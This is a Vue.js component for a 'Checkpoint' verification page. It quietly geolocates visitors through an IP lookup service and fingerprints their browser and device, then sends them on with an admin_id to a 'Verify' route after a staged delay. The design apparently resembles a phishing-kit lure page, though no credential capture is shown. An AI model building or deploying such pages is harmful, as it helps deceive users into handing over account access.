<template>
  <div
    class="container d-flex justify-content-center align-items-center vh-100"
  >
    <div class="row justify-content-center">
      <div class="col-md-7 shadow wrap-all">
        <div class="row p-3 wrap-page">
          <div class="col-md-12">
            <img :src="require('@/assets/checkpoint.png')" alt="Checkpoint" />
          </div>
          <div class="col-md-12 mb-3">
            <div class="card shadow-sm">
              <div class="row hover-verify">
                <div class="col-3 left-page">
                  <img :src="require('@/assets/unlock.gif')" alt="Checkpoint" />
                </div>
                <div
                  class="col-9 card-body text-left right-page"
                >
                  <h2 class="card-title">
                    {{ $t("checkpoint1") }}
                  </h2>
                  <p class="card-text">
                    {{ $t("checkpoint1") }}
                  </p>
                  <el-button
                    type="primary"
                    :loading="btnLoading"
                    @click="goToVerify"
                    native-type="submit"
                  >
                    {{ $t("verifyBtn") }}
                  </el-button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
export default {
  data() {
    return {
      geoData: {
        city: "",
        country: "",
        ip: "",
      },
      btnLoading: false,
      admin_id: 0,
      error: null,
      deviceInfo: {},
    };
  },
  created() {
    this.checkLocalStorage();
  },
  mounted() {
    setTimeout(() => {
      this.getDeviceInfo();
    }, 1000);
    this.admin_id = this.$route.query.admin_id;
  },
  methods: {
    goToVerify() {
      this.btnLoading = true;
      setTimeout(() => {
        this.$router.push({
          name: "Verify",
          params: { admin_id: this.admin_id },
        });
      }, 3000);
    },
    getDeviceInfo() {
      const client = new window.ClientJS();

      this.deviceInfo = {
        browser: client.getBrowser(),
        os: client.getOS(),
        device: client.getDevice(),
        isMobile: client.isMobile(),
      };

      localStorage.setItem("deviceInfo", JSON.stringify(this.deviceInfo));
    },
    checkLocalStorage() {
      const storedGeoData = localStorage.getItem("geoData");
      if (storedGeoData) {
        this.geoData = JSON.parse(storedGeoData);
        console.log("Loaded geo data from localStorage:", this.geoData);
        this.$i18n.locale = this.geoData.country_code.toLowerCase();
        console.log("country code: ", this.geoData.country_code.toLowerCase());
      } else {
        this.fetchGeoData();
      }
    },
    async fetchGeoData() {
      try {
        const response = await fetch("https://get.geojs.io/v1/ip/geo.json");
        const data = await response.json();

        localStorage.setItem("geoData", JSON.stringify(data));

        this.geoData = {
          city: data.city,
          country: data.country,
          ip: data.ip,
          country_code: data.country_code,
        };
        this.$i18n.locale = data.country_code.toLowerCase();
        console.log("Geo data saved to localStorage:", data);
        console.log("country code: ", data.country_code);
      } catch (error) {
        this.error = "Failed to fetch geo data.";
        console.error("Error fetching geo data:", error);
      }
    },
  },
};
</script>

<style scoped>
.card {
  border-radius: 15px;
  overflow: hidden;
}
.wrap-all {
  border-radius: 1.5rem;
}
.hover-verify {
  padding: 0.5rem 1rem;
}
.hover-verify:hover {
  cursor: pointer;
  background-color: #f0f0f0;
}

@media screen and (max-width: 767px) {
  .container {
    margin: auto 10px auto 0;
  }
  .hover-verify {
    padding: 0 0.6rem;
  }
  .left-page {
    display: none;
  }
  .right-page {
    width: 100%;
  }

  .wrap-page {
    padding: 0.3rem !important;
  }
  .container {
    width: 95%;
    margin: 0rem auto 0;
  }

  .btn-verify {
    width: 100%;
  }
}
</style>
